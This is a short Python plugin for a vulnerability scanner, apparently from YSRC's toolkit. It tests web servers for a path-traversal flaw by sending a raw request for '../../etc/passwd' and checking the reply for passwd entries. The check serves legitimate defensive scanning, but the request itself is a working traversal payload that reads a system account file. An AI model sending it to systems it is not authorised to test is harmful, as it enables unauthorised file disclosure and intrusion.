# coding=utf-8
import re
import socket


def get_plugin_info():
    plugin_info = {
        "name": "WebServer任意文件读取",
        "info": "web容器对请求处理不当，可能导致可以任意文件读取(例：GET ../../../../../etc/passwd)。",
        "level": "高危",
        "type": "任意文件读取",
        "author": "wolf@YSRC",
        "url": "https://www.secpulse.com/archives/4276.html",
        "keyword": "server:web",
        "source": 1
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            return u"web容器任意文件读取漏洞"
    except:
        pass
